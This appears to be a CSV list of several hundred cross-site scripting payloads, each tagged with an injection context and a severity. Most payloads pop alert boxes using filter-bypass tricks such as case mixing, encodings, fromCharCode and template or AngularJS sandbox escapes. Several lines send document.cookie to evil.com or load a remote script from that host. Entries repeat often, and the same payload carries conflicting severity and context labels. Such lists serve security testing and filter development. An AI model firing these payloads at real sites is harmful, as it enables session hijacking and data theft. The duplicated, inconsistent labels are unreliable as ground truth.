payload,context,severity
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",html_body,high
"""><svg onload=alert()>",html_body,medium
"onload=""alert(1)""",html_body,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="")>",html_body,high
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
""" onfocus=alert(1) autofocus=""",attribute,low
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
<SvG/OnLoAd=aLeRt(1)>,tag_injection,medium
j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in),js_uri,high
%3cimg onerror=alert(1) src=a%3e,html_body,medium
<marquee onstart=alert(1)>,event_handler,medium
<script>alert(1)</script>,attribute_escape,high
"<iframe src=""javascript:alert(1)"">",tag_injection,high
"<svg onload=""confirm(7)"">",html_body,medium
"""><script>prompt`1`)</script>",attribute,high
<BODY ONLOAD=alert(8839)>,html_body,medium
"<object data=""javascript:alert(1)"">",tag_injection,high
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
<svg id=1 onload=confirm(1)>,html_body,medium
javascript:confirm(1),js_uri,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
"javascript:void(document.location=""http://evil.com"")",js_uri,medium
"<ScripT>alERt(sTriNg.FrOmchArcOde(88,83,83))</sCriPt>",html_body,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",html_body,high
"setTimeout(""alert(1)"",0)",dom_sink,medium
<svg onload=confirm`1`>,attribute,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
"document.body.innerHTML=""\x3cimg src=x onerror=alert(1)\x3e""",js_uri,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",html_body,high
"data:text/html,<script>alert(1)</script>",js_uri,high
<svg id=1 onload=confirm(1)>,html_body,medium
<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(6715)&gt;`>,url,high
<script>prompt(1)</script>,js_uri,high
<svg onload=alert()>,attribute,medium
""" onfocus=alert(1) autofocus=""",attribute,low
"\"" onerror=alert(1)//",attribute_escape,low
alert(1),html_body,medium
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,medium
<svg////////onload=alert(1)>,html_body,medium
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,html_body,medium
"""><object>alert(String.fromCharCode(88,83,83))</script>",html_body,high
<iframe/onload=alert(0);>,html_body,medium
onerror=alert(0);>,html_body,medium
onload='alert(1)',html_body,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
<svgonload=alert(1)>,html_body,medium
<script>d.innerHTML+='';</script>,html_body,high
<script src=//evil.com/xss.js></script>,script_injection,high
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,html_body,high
onerror=alert(0);>,html_body,medium
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
javascript:alert(1),js_uri,high
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",html_body,high
"{{constructor.constructor(""alert(1)"")()}}",attribute,low
<input onfocus=\u0061\u006cert(1) \u0061utofocus>,event_handler,high
"""></tag><svg onload=alert(1)>",html_body,medium
+alert(1)+,html_body,medium
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",js_uri,medium
alert(String.fromCharCode(88))</SCRIPT>,html_body,high
</script><svg onload=alert(1)>,html_body,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
onload='alert(1)',attribute,medium
javascript:al'+'ert(document.domain),js_uri,low
"<object data=""javascript:alert(1)"">",tag_injection,high
onload='alert(1)',html_body,medium
"<vIdeO
><sourCe onerror=""['al\u0065'+'rt'][0]['\x63onstructor']['\x63onstructor']('return this')()[['al\u0065'+'rt'][0]]([String.fromCharCode(8238)+[!+[]+!+[]]+[![]+[]][+[]]])"">",html_body,high
\' onerror=alert(1)//,attribute_escape,low
""" onfocus=al'+'ert(1) autofocus=""",js_uri,medium
' onerror=alert(1) x=',attribute,high
"""><svg onload=alert()>",html_body,medium
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
"\' onerror
=alert(	1)//",js_uri,low
{{7*7}},template_injection,low
<svg onload=alert(1)>,event_handler,medium
onerror=self.alert(1);>,html_body,medium
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
"<svg onload=""confirm(7)"">",html_body,medium
"""><SvG OnlOAd=ALeRT()>",html_body,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
<SVg ONLoAD=ALERt()>,html_body,medium
"%3Cembed src=""javascript:alert(1)""%3E",tag_injection,low
<SCRIPT>alert(1)</SCRIPT>,script_injection,high
<img src=x onerror=alert(1)>,script_injection,low
javaSCRIPT:alert(1),js_uri,medium
"%20""><svg onload=alert(1)>",html_body,medium
' \x3e\x3cimg src=x onerror=alert(1)\x3e,js_uri,high
setInterval('ale'+'rt(10)');,html_body,high
j\u0061v\u0061script:\u0061\u006cert(document.dom\u0061in),js_uri,medium
javascript:alert(1),js_uri,high
onerror='alert(1)',html_body,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",js_block,high
<svg/onload=alert(1)>,tag_injection,medium
""" onerror=alert(1) x=""",attribute,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<%= aLeRt(1) %>,template_injection,medium
<video src=x onload=alert(1)>,event_handler,medium
"onerror=""alert(1)""",html_body,medium
top.alert(1))</SCRIPT>,attribute,high
x=1}}};alert(1)//,attribute,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",html_body,high
嘼img src=1 onerror=alert(1)嘾,html_body,medium
?url=javscript:alert(1),html_body,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
"<script src
=//evil.com/xss.js></script>",script_injection,low
<svgonload=alert(1)>,html_body,medium
""" onload=alert(1) x=""",event_handler,low
jAvAsCrIpT:CoNfIrM(1),js_uri,high
"javascript:void(document.location=""http://evil.com"")",js_uri,high
%3Cimg/src=%3Dx+onload=alert(2)%3D,attribute,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
"onerror=""alert(1)""",html_body,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
"""><svg alert(String.fromCharCode(88,83,83))</script>",html_body,high
"j\u0061v\u0061script:void(document.\u006coc\u0061tion=""http://evi\u006c.com"")",js_uri,high
<body onload=confirm(1)>,event_handler,medium
.alert(1);,html_body,medium
<script>confirm(1)</script>,script_injection,high
"""><svg onload=alert()>",html_body,medium
' onmouseover=alert(1) ',attribute,low
<svg////////onload=alert(1)>,html_body,medium
; alert(1);//,attribute,medium
"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>",script_injection,medium
<script>confirm(1)</script>,attribute,low
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",html_body,high
"\""><img src=x onerror=alert(1)>",attribute_escape,low
"ontouchstart=""alert(1)""",html_body,medium
<SCRIPT src=//evil.com/xss.js></SCRIPT>,script_injection,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",event_handler,medium
<svg onload=alert(1)>,js_uri,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
<input onfocus=alert(1) autofocus>,js_uri,high
<BODY ONLOAD=alert(‘XSS’)>,html_body,medium
' onmouseover=alert(1) ',dom_sink,high
"setTimeout(""alert(1)"",0)",dom_sink,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",attribute,high
"javascr/**/ipt:void(document.location=""http://evil.com"")",js_uri,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
"\"" onerror=alert(1)//",attribute_escape,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
"<img src
=x onerror
=alert(	1)>",tag_injection,medium
<img src=x onerror=alert(1)>,event_handler,medium
.alert(1);,html_body,medium
<SCrIpt>D.INNERHTml+='';</SCripT>,html_body,high
<svg/onload=alert(1)>,tag_injection,low
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
innerHTML=location.hash>#<script	>alert(1)</script>,html_body,high
' onerror=alert(1) x=',attribute,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,html_body,high
<%= alert(1) %>,template_injection,high
"<svG/x="">""/oNloaD=confirm()//",attribute,medium
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
' onmouseover=confirm(1) ',attribute,low
<%= confirm(1) %>,template_injection,low
<img/src=x onerror=confirm(1)//>,script_injection,low
<svg src=x onerror=alert(1)>,tag_injection,medium
"< script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
setInterval('ale'+'rt(10)');,html_body,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
alert(1);,html_body,medium
"%3Cscript%3Edocument.location=""http://evil.com/?c=""+document.cookie%3C/script%3E",attribute_escape,low
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
""" onload=alert(1) x=""",js_uri,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,low
"""><script>alert(String.fromCharCode(88,83,83))</script>",attribute,high
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute,high
"""><img src=x onerror=alert(1)>",attribute,medium
-alert(1)-',html_body,medium
"\"" onerror=alert(1)//",attribute_escape,high
<script>prompt(1)</script>,dom_sink,medium
"location=""javascript:confirm(1)""",dom_sink,medium
alert(2),html_body,medium
onload='alert(1)',html_body,medium
""" onload=alert(1) x=""",attribute,medium
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,low
<BODY ONLOAD=alert(‘XSS’)>,html_body,medium
"onerror=""alert('AnonKryptiQuz')""",html_body,medium
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",html_body,high
<img/src/onerror=alert(1),html_body,medium
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
"<embed src=""javascript:alert(1)"">",tag_injection,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
<script src=//evil.com/xss.js></script>,template_injection,low
' onload=alert(1) x=',attribute,medium
"jAvAsCrIpT:VoId(dOcUmEnT.LoCaTiOn=""HtTp://eViL.CoM"")",js_uri,medium
"""><svg
 onload=alert(1)>",html_body,medium
"\"" onload=alert(1)//",event_handler,high
"onerror=""alert('AnonKryptiQuz')""",html_body,medium
"{{c=%27%27.sub.call;b=%27%27.sub.bind;a=%27%27.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync(%22astNode=pop();astNode.type=%27UnaryExpression%27;astNode.operator=%27(window.X?void0:(window.X=true,alert(document.domain)))+%27;astNode.argument={type:%27Identifier%27,name:%27foo%27};%22);m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=%27%27.sub;$eval(%27a(b.c)%27);[].push.apply=a;}}",js_string,medium
<script src=//evil.com/xss.js></script>,script_injection,low
"javascr/**/ipt:void(document.location=""http://evil.com"")",js_uri,low
</script><svg onload=alert(1)>,html_body,medium
&quot; onerror=alert(1) x=&quot;,attribute_escape,low
"<details open ontoggle
=alert(	1)>",event_handler,low
confirm(),html_body,medium
</tag><svg onload=alert(1)>,html_body,medium
"document.body.innerHTML=""<img src=x onload=alert(1)>""",dom_sink,low
"\"" onerror=alert(1)//",attribute_escape,low
"\""><img src=x onload=alert(1)>",attribute_escape,low
<svgonload=alert(1)>,html_body,medium
' onmouseover=alert(1) ',attribute,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
</script><svg onload=alert(1)>,html_body,medium
嘼img src=1 onerror=alert(1)嘾,html_body,medium
#{alert(1)},template_injection,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",html_body,high
<img/’onerror=alert(1) src=a>,html_body,medium
<textarea>d.innerHTML+='';</script>,html_body,high
onload='confirm`1`',html_body,medium
""" onload=alert(1) x=""",attribute,medium
-alert(23)/,html_body,medium
<img src=x onerror=alert(1)>,tag_injection,high
"{{constructor.constructor(""al'+'ert(1)"")()}}",template_injection,medium
"""><svg onload=alert(1)>",html_body,medium
javascript:confirm`1`,url,medium
<svg onload=alert()>,html_body,medium
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,html_body,high
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-,html_body,medium
-alert(23)/,html_body,medium
%3Cinput onfocus=alert(1) autofocus%3E,event_handler,low
<image src/onerror=alert(1)>,html_body,medium
"<Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==""))>",html_body,high
"\"" onerror=alert(1)//",attribute_escape,medium
alert(2),html_body,medium
"<embed src=""javascript:alert(1)"">",tag_injection,high
javascript:alert(document.domain),js_uri,high
+alert(1)+,html_body,medium
${alert(1)},template_injection,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
<img src=x onerror=alert(1)>,script_injection,low
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",html_body,high
<input onfocus=confirm(1) autofocus>,event_handler,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",html_body,high
-alert(1)-',html_body,medium
onload=”alert(‘AnonKryptiQuz’),html_body,medium
<script>alert(1)</script>,script_injection,medium
"document.body.innerHTML=""<svg src=x onerror=alert(1)>""",dom_sink,medium
"<details open ontoggle
=alert(	1)>",js_uri,medium
<body onload=alert(1)>,tag_injection,low
alert(String.fromCharCode(88))</SCRIPT>,html_body,high
""">< script alert(String.fromCharCode(88,83,83))</script>",html_body,high
onload=”alert(‘AnonKryptiQuz’),html_body,medium
<script>alert(1)</script>,tag_injection,medium
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",html_body,high
onerror='alert(1)',html_body,medium
"%20""><svg onload=alert(1)>",html_body,medium
confirm(),html_body,medium
javascript:alert(document.domain),js_uri,low
嘼img src=1 onerror=alert(1)嘾,html_body,medium
""" onload=alert(1) x=""",attribute,high
"//"";alert(String.fromCharCode(88,83,83))",html_body,high
<script ^__^>alert(String.fromCharCode(49))</script ^__^,attribute,high
<img src=x onerror=alert(1)>,event_handler,medium
onload='alert(1)',html_body,medium
<script>prompt(1)</script>,script_injection,high
"<embed src=""javascript:alert(1)"">",tag_injection,low
javascript:confirm(1),template_injection,medium
<;BODY ONLOAD=alert(';XSS';)>;,html_body,medium
<script>confirm(document.domain)</script>,script_injection,low
<img/src=x onerror=alert(1)//>,event_handler,medium
"{{constructor.constructor(""alert(1)"")()}}",dom_sink,low
-alert(23)/,html_body,medium
onload='prompt`1`',html_body,medium
"<iframe src=""javascript:al'+'ert(1)"">",tag_injection,low
<iframe/onload=alert(0);>,html_body,medium
"eval(""alert(1)"")",attribute_escape,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",html_body,high
{{constructor.constructor(‘a=document;confirm(a.domain)’)()}},js_string,medium
<svg/onload=alert(1)>,html_body,medium
"javascript:void(document.location=""http://evil.com"")",attribute,medium
%3cimg onerror=alert(1) src=a%3e,html_body,medium
javascript:alert(1),js_uri,low
<img src/onerror=prompt(8)>,html_body,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,high
alert(1),html_body,medium
%3cimg onerror=alert(1) src=a%3e,html_body,medium
<img src/onerror=prompt(8)>,html_body,medium
""" onerror=alert(1) x=""",attribute,high
onerror='alert(1)',html_body,medium
innerHTML=location.hash>#<script>alert(1)</script>,html_body,high
<script>alert(1)</script>,script_injection,high
<img src/onerror=alert(1)>,html_body,medium
<img src/onerror=prompt(8)>,html_body,medium
